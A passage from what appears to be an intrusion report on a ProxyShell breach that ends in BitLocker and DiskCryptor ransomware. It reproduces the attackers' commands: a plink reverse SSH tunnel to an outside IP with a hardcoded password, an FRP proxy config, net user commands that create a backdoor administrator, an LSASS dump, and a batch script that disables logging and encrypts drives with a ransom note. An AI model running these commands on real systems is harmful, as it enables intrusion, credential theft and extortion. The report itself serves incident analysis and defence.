community comments, including insights from a user named 'thor' discussing a YARA signature match related to the file.\nTranscription: |\n  25 security vendors flagged this file as malicious\n  \n  e3eac25c3beb77ffed609c53b447a18ec8a0e20fb94a6442a51d72ca9e6f7cd2\n  dllhost.exe\n  64bits\n  assembly\n  direct-cpu-clock-access\n  peexe\n  runtime-modules\n  \n  Detection\n  Details\n  Behavior\n  Community\n  Comments\n  thor  16 days ago\n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTL_PUA_FRP_FastReverseProxy_Oct21_1\n  RULE_SET: Livehunt - Hacktools1 Indicators\n  RULE_TYPE: Valhalla Rule Feed Only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTL_PUA_FRP_FastReverseProxy_Oct21_1\n  DESCRIPTION: Detects fast reverse proxy PUA tool often used by threat groups\n  REFERENCE: https://github.com/fatedier/frp\n  RULE_AUTHOR: Florian Roth\n  \n  Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/fatedier/frp/issues.\n  \n  Detection Timestamp: 2021-10-24 11:06\n  AV Detection Ratio: 25 / 68\n  \n  Use these tags to search for similar matches: #pua #frp #fastreverseproxy #hktl_pua_frp_fastreverseproxy_oct21_1 #open_source_tool\n  More information: https://www.nextron-systems.com/on-virustotal-matches/\n```\n\nThe `C:\\ProgramData\\Microsoft\\Windows\\Runtime\\RuntimeBroker` file is linked to the execution above, and contained the following lines of code which are a configuration file for FRP:\n\n```\n[common]\nlog_level = trace\nlogin_fail_exit = true\n\n[RedactedHOSTNAME.RedactedDOMAIN_RedactedIP]\ntype = tcp\nremote_port = 10151\nplugin = http_proxy\nuse_encryption = true\nuse_compression = true\n```\n\nThe above configuration creates a http proxy bound to port 10151/tcp using encryption and compression.\n\nThe threat actors also dropped and executed `plink.exe`, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:\n\n```\n\"powershell.exe\" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof\n```\n\n```image\nAlt: Plink\nDescription: The image displays a table that captures various security event logs related to an intrusion. It includes columns for the action type (e.g., 'FileCreated', 'ProcessCreated', 'ConnectionSuccess'), the initiating process name (e.g., 'w3wp.exe', 'plink.exe', 'powershell.exe'), the process command line used (which details how the processes were executed), and the remote IP address involved in the connections. The logs document actions taken during an attack, specifically focusing on the use of the 'plink' executable for creating a secure shell tunnel to an external IP address.\nTranscription: |\n  | L#   | Tag | Action Type       | Initiating Process | File Name | Process Command Line                                                                                         | Remote IP                                                                                                  |\n  | ---- | --- | ----------------- | ------------------ | --------- | ------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------- |\n  | 3044 |     | FileCreated       | w3wp.exe           | plink.exe |                                                                                                              |                                                                                                            |\n  | 2983 |     | ProcessCreated    | w3wp.exe           |           | \"powershell.exe\" /c echo y                                                                                   | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof |\n  | 2977 |     | ProcessCreated    | powershell.exe     |           | \"plink.exe\" -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof |                                                                                                            |\n  | 2975 |     | ConnectionSuccess | plink.exe          |           |                                                                                                              |                                                                                                            |\n  | 2973 |     | ConnectionSuccess | plink.exe          |           |                                                                                                              | 148.251.71.182                                                                                             |\n  |      |     |                   |                    |           |                                                                                                              | 127.0.0.1                                                                                                  |\n```\n\nIn the command line above you can see several options being used:\n\n```\n-N : To avoid starting the shell\n-T : To avoid the allocation of a pseudo-terminal\n-R : Forward remote port to local address\n-P 22 : Port number\n-l forward : Login name\n-pw Socks@123 : Login password\n-no-antispoof : To omit anti-spoofing prompt after authentication\n```\n\nAfter running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.\n\n### Persistence\n\n**Valid Accounts**\nTo maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount. It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic. The DSMA is disabled by default on the desktop SKUs (full windows SKUs) and WS 2016 with the Desktop (Reference).\n\nTo achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:\n\n```\n\"powershell.exe\" /c net user DefaultAccount /active:yes\n```\n\nAfter activating the account, the threat actors set the password of this account to `P@ssw0rd` and added it to Administrators and Remote Desktop Users groups.\n\n```\n\"powershell.exe\" /c net user DefaultAccount P@ssw0rd\n\"powershell.exe\" /c net localgroup \"Remote Desktop Users\" /Add DefaultAccount\n\"powershell.exe\" /c net localgroup Administrators /Add DefaultAccount\n```\n\n### Privilege Escalation\n\nProxyShell exploitation provided the threat actors with NT AUTHORITY\\SYSTEM privileges. Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials. Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.\n\n### Defense Evasion\n\nAdvanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion. However, the threat actors performed masquerading with many of their tools:\n- They created `login.aspx` web shell in the same folder as the legitimate OWA login page.\n- They renamed Fast Reverse Proxy to `dllhost.exe` to remain stealthy.\n- They created the Scheduled Task with “\\Microsoft\\Windows\\Maintenance\\CacheTask” name to stay unnoticed.\n\n### Credential Access\n\n**LSASS Dump**\nThe threat actors dumped LSASS process manually using the Task Manager CAR-2019-08-001:\n\n```\nFile created:\nRuleName: -\nUtcTime: REDACTED 10:40:24.958\nProcessGuid: {BF388D9C-AB02-614D-B552-000000000700}\nProcessId: 17480\nImage: C:\\Windows\\system32\\taskmgr.exe\nTargetFilename: C:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\2\\lsass.DMP\n```\n\nTo facilitate the LSASS dump exfiltration, the threat actors created a zip archive named `lsass.zip`:\n\n```\nFile created:\nRuleName: -\nUtcTime: REDACTED 10:40:48.698\nProcessGuid: {BF388D9C-AADF-614D-A052-000000000700}\nProcessId: 17412\nImage: C:\\Windows\\Explorer.EXE\nTargetFilename: C:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\2\\lsass.zip\n```\n\n### Discovery\n\n#### Environment Discovery\n\nAs previously mentioned, we saw multiple cmdlets related to exchange:\n\n```\nGet-MailboxRegionalConfiguration\nGet-Mailbox\nGet-ExchangeServer\nGet-InboxRule\n```\n\nUsing the dropped web shells, the threat actors performed the following commands:\n\n```image\nAlt: Webshell Execution\nDescription: The image titled 'Webshell Execution' illustrates the execution of commands via a webshell in an attack scenario. It includes two primary sections: one showing a series of commands executed using 'cmd.exe' and another using 'PowerShell.exe'. The commands listed include network configuration checks (like 'ipconfig /all' and 'hostname'), network utility commands (such as 'ping' and 'nslookup'), and user account queries ('net user' and 'query user'). Both sections also display a specific webshell file name, indicating the malicious scripts being used to facilitate the commands. This diagram provides clear insight into the attack methods employed by threat actors.\nTranscription: |\n  Webshell Execution\n  \n  w3wp.exe\n  \n  aspx_qdajsiczfzx.aspx\n      cmd.exe\n          ipconfig /all\n          hostname\n          ping themoscowtimes.com\n          nslookup themoscowtimes.com 8.8.8.8\n          systeminfo\n          nltest /trusted_domains\n          nbstat -n\n          arp -a\n          net user\n          query user\n          echo ok\n  \n  aspx_gtonvbgidhh.aspx\n      PowerShell.exe\n          Same commands as aspx_qdajsiczfzx.aspx\n          net user DefaultAccount /active:yes\n          net user DefaultAccount P@ssw0rd\n          time /t\n          net localgroup \"Remote Desktop Users\" /Add DefaultAccount\n          echo y | plink.exe -N -T 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof\n```\n\n#### Port Scanning\n\nThe threat actors used KPortScan 3.0, a widely used port scanning tool on Hacking Forums, to perform network scanning on the internal network:\n\n```image\nAlt: Kport\nDescription: The image displays the user interface of KPortScan 3.0, a port scanning tool. The interface includes options for setting the number of threads (400), selecting a port (default 3389), and choosing various operational modes such as scanning with or without port options. There are buttons for loading ranges, starting the scan, and stopping the scan, along with progress indicators for the current range and overall progress.\nTranscription: |\n  KPortScan 3.0\n  \n  threads: 400\n  port: 3389\n  [ ] with port\n  [ ] without port\n  [ ] append to file\n  [ ] clear file and add\n  \n  Load ranges\n  \n  [Clear] [Slow stop] [Fast stop]\n  \n  Count of goods:\n  Current range:\n  Current progress: 0\n  Main progress:\n  \n  Special for www.proxy-base.org\n  by Kremi9\n```\n\n```image\nAlt: Port Scanning\nDescription: The image displays a detailed log or table related to the execution of a port scanning tool, KPortScan 3.0. It includes various columns such as 'Line', 'Tag', 'Action Type', 'Initiating Process File Name', 'Process Command Line', 'Folder Path', 'File Name', 'Remote IP', and 'Remote Port'. The log entries indicate actions like 'FileCreated', 'ProcessCreated', and multiple 'ConnectionSuccess' entries, showing the activity of the KPortScan tool on a local system with specific remote IPs and ports.\nTranscription: |\n  | Line | Tag | Action Type       | Initiating Process File Name | Process Command Line | Folder Path                                   | File Name      | Remote IP | Remote Port |\n  | ---- | --- | ----------------- | ---------------------------- | -------------------- | --------------------------------------------- | -------------- | --------- | ----------- |\n  | 2627 |     | FileCreated       | explorer.exe                 |                      | C:\\Users\\DefaultAccount\\Desktop\\KPortScan 3.0 | KPortScan3.exe | 389       |             |\n  | 2628 |     | FileCreated       | explorer.exe                 |                      | C:\\Users\\DefaultAccount\\Desktop\\KPortScan 3.0 | results.txt    |           |             |\n  | 2619 |     | ProcessCreated    | explorer.exe                 | \"KPortScan3.exe\"     |                                               |                |           |             |\n  | 2611 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2612 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2594 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2595 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2596 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2602 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2603 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2604 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2605 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2606 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2581 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2582 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2583 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2588 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2589 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n  | 2591 |     | ConnectionSuccess | KPortScan3.exe               |                      |                                               |                |           |             |\n```\n\n### Lateral Movement\n\nThe threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account. Below is an extract focusing on RDP activity from patient 0:\n\n```image\nAlt: RDP\nDescription: The image displays a filtered log from a network analysis tool, showing RDP (Remote Desktop Protocol) activity over a specific time period. The logs include various columns such as timestamps, unique identifiers, source and destination IP addresses, results, and security protocols associated with RDP connections. Notably, there is a mention of 'Ransomware Deployment' and 'First LM' (likely referring to the first lateral movement), indicating that this log captures critical data related to lateral movement during a ransomware attack.\nTranscription: |\n  | ts                      | _path | uid | id > orig_h | id > orig_p | id > resp_h | id > resp_p | cookie | result    | security_protocol | client_channels | keyboard_layout | client_build | client_name | client_dig_product |\n  | ----------------------- | ----- | --- | ----------- | ----------- | ----------- | ----------- | ------ | --------- | ----------------- | --------------- | --------------- | ------------ | ----------- | ------------------ |\n  | 2021-11-17 15:33:215    | rdp   | g5  | 44          | 15764       | 57          | 3389        |        | encrypted | HYBRID_EX         |                 |                 |              |             |                    |\n  | 2021-11-17 15:39:138    | rdp   | N9  | 44          | 15782       | 55          | 3389        |        | encrypted | HYBRID_EX         |                 |                 |              |             |                    |\n  | 2021-11-17 15:43:557    | rdp   | Gg  | 44          | 15473       | 54          | 3389        |        | encrypted | HYBRID_EX         |                 |                 |              |             |                    |\n  | 2021-11-17 15:50:199    | rdp   | h   | 44          | 15467       | 44          | 3389        |        | encrypted | HYBRID_EX         |                 |                 |              |             |                    |\n  | 2021-11-17 14:53:157    | rdp   | 8   | 44          | 13983       | 42          | 3389        |        | Redacted  |                   |                 |                 |              |             |                    |\n  | 2021-11-17 15:10:904    | rdp   | y3  | 44          | 13983       | 39          | 3389        |        | encrypted | HYBRID_EX         |                 |                 |              |             |                    |\n  | 2021-11-17 15:19:391    | rdp   | i   | 44          | 13706       | 37          | 3389        |        | encrypted | HYBRID_EX         |                 |                 |              |             |                    |\n  | 2021-11-17 15:25:080    | rdp   | D2  | 44          | 13422       | 31          | 3389        |        | encrypted | HYBRID_EX         |                 |                 |              |             |                    |\n  | 2021-11-17 10:54:22.242 | rdp   | a   | 44          | 47351       | 30          | 3389        |        | Redacted  |                   |                 |                 |              |             |                    |\n```\n\nThe threat actors also appeared to use Impacket’s wmiexec to perform lateral movement on one of the domain controllers.\n\n```image\nAlt: Impacket\nDescription: The image displays a log excerpt from a cybersecurity incident, detailing various actions taken during a lateral movement attack. It includes columns for 'Line', 'Action Type', 'Initiating Process Command Line', and 'Process Command Line'. The log entries show various instances of processes being created, specifically highlighting commands related to 'svchost.exe' and 'wmiprvs.exe', indicating potential misuse of WMI for executing commands remotely. The entries reflect timestamps and parameters used during the execution, which are critical for understanding the timeline and methods of the attack.\nTranscription: |\n  | Line | Tag | Action Type                 | Initiating Process Command Line | Process Command Line                                              |\n  | ---- | --- | --------------------------- | ------------------------------- | ----------------------------------------------------------------- |\n  | 2482 |     | ProcessCreatedUsingWmiQuery | svchost.exe -k netsvcs -p       | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504521.8342571 2>&1 |\n  | 2483 |     | ProcessCreated              | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504521.8342571 2>&1 |\n  | 2484 |     | ProcessCreated              | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504521.8342571 2>&1 |\n  | 2474 |     | ProcessCreatedUsingWmiQuery | svchost.exe -k netsvcs -p       | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504521.8342571 2>&1 |\n  | 2475 |     | ProcessCreated              | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504521.8342571 2>&1 |\n  | 2476 |     | ProcessCreatedUsingWmiQuery | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504521.8342571 2>&1 |\n  | 2275 |     | ProcessCreatedUsingWmiQuery | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504901.4769702 2>&1 |\n  | 2276 |     | ProcessCreated              | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504901.4769702 2>&1 |\n  | 2277 |     | ProcessCreated              | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504901.4769702 2>&1 |\n  | 2271 |     | ProcessCreatedUsingWmiQuery | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504901.4769702 2>&1 |\n  | 2272 |     | ProcessCreated              | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504901.4769702 2>&1 |\n  | 2273 |     | ProcessCreated              | wmiprvs.exe -secured -Embedding | cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$__1632504901.4769702 2>&1 |\n```\n\nWe do not have a clear explanation for that behavior. However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.\n\n### Collection\n\nNo data collection was observed in this intrusion. The threat actors only collected the dumped LSASS using a zip archive:\n\n```\nFile created:\nRuleName: -\nUtcTime: REDACTED 10:40:48.698\nProcessGuid: {BF388D9C-AADF-614D-A052-000000000700}\nProcessId: 17412\nImage: C:\\Windows\\Explorer.EXE\nTargetFilename: C:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\2\\lsass.zip\nCreationUtcTime: REDACTED 10:40:48.697\n```\n\n### Command and Control\n\nNo Command and Control frameworks were used during this intrusion. Initial access to the environment was performed using the web shell upon the exploitation of ProxyShell, then using valid accounts and Remote Desktop Services.\n\nThreat actors created a SSH tunnel to 148.251.71[.]182 using *plink* in order to forward RDP access:\n\n```image\nAlt: Plink\nDescription: The image displays a table that captures various security event logs related to an intrusion. It includes columns for the action type (e.g., 'FileCreated', 'ProcessCreated', 'ConnectionSuccess'), the initiating process name (e.g., 'w3wp.exe', 'plink.exe', 'powershell.exe'), the process command line used (which details how the processes were executed), and the remote IP address involved in the connections. The logs document actions taken during an attack, specifically focusing on the use of the 'plink' executable for creating a secure shell tunnel to an external IP address.\nTranscription: |\n  | L#   | Tag | Action Type       | Initiating Process | File Name | Process Command Line                                                                                         | Remote IP                                                                                                  |\n  | ---- | --- | ----------------- | ------------------ | --------- | ------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------- |\n  | 3044 |     | FileCreated       | w3wp.exe           | plink.exe |                                                                                                              |                                                                                                            |\n  | 2983 |     | ProcessCreated    | w3wp.exe           |           | \"powershell.exe\" /c echo y                                                                                   | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof |\n  | 2977 |     | ProcessCreated    | powershell.exe     |           | \"plink.exe\" -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof |                                                                                                            |\n  | 2975 |     | ConnectionSuccess | plink.exe          |           |                                                                                                              |                                                                                                            |\n  | 2973 |     | ConnectionSuccess | plink.exe          |           |                                                                                                              | 148.251.71.182                                                                                             |\n  |      |     |                   |                    |           |                                                                                                              | 127.0.0.1                                                                                                  |\n```\n\nLooking at this IP address on VirusTotal, we can observe that all “Communicating Files” related to it trigger FRP AV Signatures or Yara rules:\n\n```image\nAlt: VT Relations\nDescription: The image is a table presenting information about 'Communicating Files' related to a specific IP address, which has been scanned on multiple dates. It includes columns for the date scanned, the number of detections out of total scans, the file type (Win32 EXE), and the name of the files (such as 'logo.png' and 'svchost.exe'). The table displays a trend of increasing detections over time.\nTranscription: |\n  | Scanned    | Detections | Type      | Name        |\n  | ---------- | ---------- | --------- | ----------- |\n  | 2021-11-01 | 4 / 67     | Win32 EXE | logo.png    |\n  | 2021-10-30 | 15 / 68    | Win32 EXE | svchost.exe |\n  | 2021-11-01 | 20 / 69    | Win32 EXE | logo.png    |\n  | 2021-10-28 | 35 / 69    | Win32 EXE | svchost.exe |\n  | 2021-10-25 | 23 / 68    | Win32 EXE | svchost.exe |\n```\n\nWe can conclude that those threat actors are used to this protocol tunneling technique.\n\n### Exfiltration\n\nExcept `lsass.zip`, no data exfiltration or staging have been observed during this intrusion.\n\n### Impact\n\nIn this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide. On servers a batch script named `setup.bat` was used and on workstations the GUI application named `dcrypt.exe`(DiskCryptor) was executed instead. Both were executed via the threat actors after RDP login to each host.\n\n```image\nAlt: BitLocker and DiskCryptor Ransom Execution\nDescription: The image is a flowchart that illustrates the ransomware execution process involving BitLocker and DiskCryptor. At the top, it states 'BitLocker and DiskCryptor Ransom Execution' in a red box. The flowchart depicts the sequence of events starting from 'RDP Access' leading to 'setup.bat' being created on servers, and then to 'dcrypt.exe' being created on workstations. It details how 'Explorer.EXE' is involved in file creation for both the 'setup.bat' and 'dcrypt.exe', including their paths and parent processes. The overall structure visually conveys the relationships and processes involved in the ransomware attack.\nTranscription: |\n  BitLocker and DiskCryptor Ransom Execution\n  \n  RDP Access\n      ├── Servers\n      │       └── setup.bat\n      │               ├── Explorer.EXE\n      │               │       ├── File Creation\n      │               │       │       C:\\Users\\$USER\\Desktop\\setup.bat\n      │               │       └── Parent Process\n      │               │               C:\\Windows\\System32\\cmd.exe /C \"C:\\Users\\$USER\\Desktop\\setup.bat\"\n      └── Workstations\n              └── dcrypt.exe\n                      ├── Explorer.EXE\n                      │       ├── File Creation\n                      │       │       C:\\Users\\$USER\\Desktop\\dcrypt.exe\n                      │       └── Parent Process\n                      │               C:\\Users\\$USER\\Desktop\\dcrypt.exe\n```\n\nOn servers they copied over a file named `setup.bat`.\n\n```image\nAlt: setup.bat\nDescription: The image displays a log entry indicating the creation of a file named `setup.bat` on a Windows system. It includes details such as the file creation time, process ID, and the image path (C:\\Windows\\Explorer.EXE) that executed the file creation. The log captures the context of the incident, specifically the execution of the batch script used during a ransomware attack.\nTranscription: |\n  \"File created:\n  RuleName: -\n  UtcTime:\n  ProcessGuid: {93df2008-096e-614e-dd13-000000000070}\n  ProcessId: 4080\n  Image: C:\\Windows\\Explorer.EXE\n  TargetFilename: C:\\Users\\ \\Desktop\\setup.bat\n  CreationUtcTime:\n```\n\nThey then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.\n\n```image\nAlt: setup.bat commands\nDescription: The image is a screenshot of a command line process creation log related to Windows Command Shell. It provides specific technical details including the process ID, command executed, and the original command line that launched the process. Key information includes a rule name associated with MITRE ATT&CK, the process image path (C:\\Windows\\System32\\cmd.exe), and the command line used to run a batch script ('C:\\Users\\Desktop\\setup.bat'). Additionally, there are hash values for the process, user information, integrity level, and parent process details.\nTranscription: |\n  \"Process Create:\n  RuleName: technique_id=T1059.003, technique_name=Windows Command Shell\n  UtcTime:\n  ProcessGuid: {93df2008-09b6-614e-ee13-000000000700}\n  ProcessId: 332\n  Image: C:\\Windows\\System32\\cmd.exe\n  FileVersion: 10.0. (WinBuild. )\n  Description: Windows Command Processor\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: Cmd.Exe\n  CommandLine: \"C:\\Windows\\System32\\cmd.exe\" /C \"C:\\Users\\Desktop\\setup.bat\"\n  CurrentDirectory: C:\\Users\\Desktop\\\n  User:\n  LogonGuid: {0xE20A0ACB}\n  TerminalSessionId: 4\n  IntegrityLevel: High\n  Hashes: SHA1={83f437CD76A89EC983E364E219944DA3DAB464, MD5=97B54B56699380B773EAF2B414240F6}\n  ParentProcessGuid: {93df2008-09b6-614e-dd13-000000000700}\n  ParentProcessId: 4080\n  ParentImage: C:\\Windows\\explorer.exe\n  ParentCommandLine: C:\\Windows\\Explorer.EXE\n```\n\nBelow are the commands executed by the script:\n\n```\nnet stop eventlog /y\nsc config TermService start= auto\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v TSEnabled /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow protocol=TCP localport=3389\nnet start TermService\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseAdvancedStartup /t REG_DWORD /d 1 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPM /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKey /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /V RecoveryKeyMessageSource /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMPIN /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v RecoveryKeyMessage /t REG_SZ /d \" +-+-+- Your drives are Encrypted! Contact us immediately: REDACTED@onionmail.org -+-+-+\" /f\npowershell -c \"Import-Module ServerManager; ADD-WindowsFeature BitLocker -Restart\"\npowershell -c \"Install-WindowsFeature BitLocker ΓÇôIncludeAllSubFeature -IncludeManagementTools -Restart\"\npowershell -c \"Initialize-Tpm -AllowClear -AllowPhysicalPresence -ErrorAction SilentlyContinue\"\npowershell -c \"Get-Service -Name defragsvc -ErrorAction SilentlyContinue | Set-Service -Status Running -ErrorAction SilentlyContinue\"\npowershell -c \"BdeHdCfg -target $env:SystemDrive shrink -quiet -restart\"\nsc config eventlog start= auto\ncmd /c del \"C:\\Windows\\setup.bat\"\ncmd /c del \"C:\\Users\\REDACTED\\Desktop\\setup.bat\"\n```\n\nRunning this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:\n\n```image\nAlt: Bitlocker\nDescription: The image displays a BitLocker drive encryption prompt, indicating that the user is required to enter a password to unlock the drive. The interface is presented with a dark background and white text, featuring instructions on how to reveal the password as it is typed by pressing the Insert key. Additionally, it provides options to continue or escape to recovery. This image is relevant to the context of the ransomware attack, illustrating the end result of the encryption process executed by the threat actors.\nTranscription: |\n  BitLocker drive encryption\n  \n  Enter the password to unlock this drive\n  [                                                  ]\n  \n  Press the Insert key to see the password as you type.\n  \n  ENTER=Continue\n  ESC=Recovery\n```\n\nA binary called `dcrypt.exe`, was dropped on a backup server and immediately deleted. While this utility was not executed on any servers in the environment it was deployed to all the workstations.\n\n```image\nAlt: dcrypt.exe\nDescription: The image depicts a README file for DiskCryptor, an open-source disk encryption solution. It includes a description of DiskCryptor's functionality, noting its differences from proprietary encryption solutions like BitLocker. The text mentions the history of DiskCryptor, its development for Windows 10 compatibility, and a warning that BitLocker cannot be considered secure. The layout features formatted text, emphasizing key points about DiskCryptor's purpose and features.\nTranscription: |\n  DiskCryptor is an open encryption solution that offers encryption of all disk partitions, including the system partition. The fact of openness goes in sharp contrast with the current situation, where most of the software with comparable functionality is completely proprietary, which makes it unacceptable to use for protection of confidential data.\n  \n  Originally DiskCryptor was developed as a replacement for DriveCrypt Plus Pack and PGP WDE by ntldr back at diskcryptor.net, however since there was no more development since 2014 we decided to continue the development on our own here. The new releases of DiskCryptor are ment as a replacement for BitLocker from Microsoft as BitLocker can NOT be considered secure.\n  \n  We have updated DiskCryptor for use with windows 10, adding a UEFI/GPT bootloader as well as other minor fixes to improve windows 10 compatibility. We aim at further improving and maintaining windows 10 compatibility.\n  \n  This website, for now, mostly mirrors information from the old wiki, as we develop new features new content will be added to reflect the changes in the new builds.\n```\n\nThe executable used is the current release of the installer for the utility DiskCryptor.\n\nWe are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.\n\n```image\nAlt: DiskCryptor\nDescription: The image displays a list of the Windows editions that support BitLocker, a disk encryption feature. The bullet points highlight specific versions including Ultimate and Enterprise editions of Windows Vista and Windows 7, Pro and Enterprise editions of Windows 8 and 8.1, and Pro, Enterprise, and Education editions of Windows 10, along with Windows Server 2008 and later. The text is styled in a way that emphasizes the compatibility of BitLocker with different operating systems.\nTranscription: |\n  BitLocker is available on:\n  - Ultimate and Enterprise editions of Windows Vista and Windows 7\n  - Pro and Enterprise editions of Windows 8 and 8.1\n  - Pro, Enterprise, and Education editions of Windows 10\n  - Windows Server 2008 and later\n```\n\nhttps://en.wikipedia.org/wiki/BitLocker\n\nUse of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.\n\nThis executable, however, reminds you on install that it is “beta” software.\n\n```image\nAlt: Beta Software\nDescription: The image displays a warning dialog box indicating that the software being installed is a beta release. It contains a caution symbol and a message stating that the tool is provided on an 'as is' basis, with no warranty of any kind, express or implied. The dialog box includes an 'OK' button for the user to acknowledge the warning.\nTranscription: |\n  This is a BETA release, use it at your own risk!\n  This tool is provided on an 'as is' basis, with no warranty of any kind, express or implied.\n```\n\nThe setup process then works as most windows installers and requires a reboot of the system. During installation a kernel mode driver is added to support the encryption process.\n\n```image\nAlt: Kernel Mode Driver\nDescription: The image is a snippet of text that provides technical details about a service installed in the system related to DiskCryptor. It includes the service name ('DiskCryptor driver'), the file path of the service ('C:\\Windows\\system32\\drivers\\dcrypt.sys'), the type of service ('kernel mode driver'), the start type ('boot start'), and an empty service account field. This information is relevant for understanding the operation and integration of the DiskCryptor within the system, particularly in the context of ransomware attacks.\nTranscription: |\n  \"A service was installed in the system.\n  Service Name: DiskCryptor driver\n  Service File Name: C:\\Windows\\system32\\drivers\\dcrypt.sys\n  Service Type: kernel mode driver\n  Service Start Type: boot start\n  Service Account: \"\n```\n\nAfter reboot, the program GUI allows you to configure the encryption options.\n\n```image\nAlt: Encryption Options\nDescription: The image displays the user interface of DiskCryptor version 1.2 Beta 3. It shows a window titled 'Disk Drives' which lists the partitions of the 